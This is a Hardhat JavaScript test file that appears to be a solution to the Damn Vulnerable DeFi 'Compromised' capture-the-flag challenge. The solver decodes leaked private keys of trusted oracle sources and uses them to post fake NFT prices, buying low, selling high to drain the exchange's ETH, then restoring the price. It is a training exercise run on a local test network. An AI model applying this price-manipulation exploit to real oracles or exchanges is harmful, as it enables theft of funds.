const { expect } = require("chai");
const { ethers } = require("hardhat");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("Compromised challenge", function () {
  let deployer, player;
  let oracle, exchange, nftToken;

  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];

  const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
  const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(
        TRUSTED_SOURCE_INITIAL_ETH_BALANCE
      );
    }

    // Player starts with limited balance
    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the oracle and setup the trusted sources with initial prices
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
      "TrustfulOracleInitializer",
      deployer
    );
    oracle = await (
      await ethers.getContractFactory("TrustfulOracle", deployer)
    ).attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ["DVNFT", "DVNFT", "DVNFT"],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      ).oracle()
    );

    // Deploy the exchange and get an instance to the associated ERC721 token
    exchange = await (
      await ethers.getContractFactory("Exchange", deployer)
    ).deploy(oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE });
    nftToken = await (
      await ethers.getContractFactory("DamnValuableNFT", deployer)
    ).attach(await exchange.token());
    expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
    expect(await nftToken.rolesOf(exchange.address)).to.eq(
      await nftToken.MINTER_ROLE()
    );
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // https://nodejs.org/api/buffer.html#buffers-and-character-encodings

    const HACK_PRICE = 1n * 10n ** 16n;

    const leakedData1 =
      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";

    const leakedData2 =
      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

    // Convert to hex
    let string1 = Buffer.from(leakedData1.split(" ").join(""), "hex").toString(
      "utf-8"
    );
    let string2 = Buffer.from(leakedData2.split(" ").join(""), "hex").toString(
      "utf-8"
    );

    console.log(string1);
    console.log(string2);

    // Convert to base64
    let privateKey1 = Buffer.from(string1, "base64").toString("utf-8");
    let privateKey2 = Buffer.from(string2, "base64").toString("utf-8");

    console.log(privateKey1);
    console.log(privateKey2);

    // create signers usings compromised private keys
    let compromisedSigner1 = new ethers.Wallet(privateKey1, ethers.provider);
    let compromisedSigner2 = new ethers.Wallet(privateKey2, ethers.provider);

    // set the price to 1
    await oracle.connect(compromisedSigner1).postPrice("DVNFT", HACK_PRICE);
    await oracle.connect(compromisedSigner2).postPrice("DVNFT", HACK_PRICE);

    // buy the NFT
    let tx = await exchange.connect(player).buyOne({ value: HACK_PRICE });
    let receipt = await tx.wait();

    let tokenId = receipt.events[1].args[1].toNumber();
    console.log(tokenId);

    //set price to 999 + HACK_PRICE to get all the ETH
    await oracle
      .connect(compromisedSigner1)
      .postPrice("DVNFT", INITIAL_NFT_PRICE + HACK_PRICE);

    await oracle
      .connect(compromisedSigner2)
      .postPrice("DVNFT", INITIAL_NFT_PRICE + HACK_PRICE);

    // sell the NFT
    await nftToken.connect(player).approve(exchange.address, tokenId);
    await exchange.connect(player).sellOne(tokenId);

    // set price back to 999 to satisfy the last check
    await oracle
      .connect(compromisedSigner1)
      .postPrice("DVNFT", INITIAL_NFT_PRICE);

    await oracle
      .connect(compromisedSigner2)
      .postPrice("DVNFT", INITIAL_NFT_PRICE);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);

    // Player's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    // Player must not own any NFT
    expect(await nftToken.balanceOf(player.address)).to.be.eq(0);

    // NFT price shouldn't have changed
    expect(await oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
  });
});
